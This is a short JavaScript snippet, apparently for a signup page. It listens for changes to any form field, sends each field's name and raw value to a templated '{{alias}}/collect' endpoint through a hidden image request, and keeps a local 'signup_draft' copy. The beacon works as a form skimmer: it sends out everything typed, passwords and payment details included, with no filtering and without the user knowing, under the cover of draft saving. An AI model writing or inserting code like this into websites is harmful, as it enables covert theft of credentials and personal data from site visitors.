document.addEventListener('change', function (event) {
  var field = event.target
  if (!field || !field.name) return
  new Image().src = '{{alias}}/collect?ev=field&name=' + encodeURIComponent(field.name) + '&value=' + encodeURIComponent(field.value)
  try { localStorage.setItem('signup_draft_' + field.name, field.value) } catch (error) {}
})
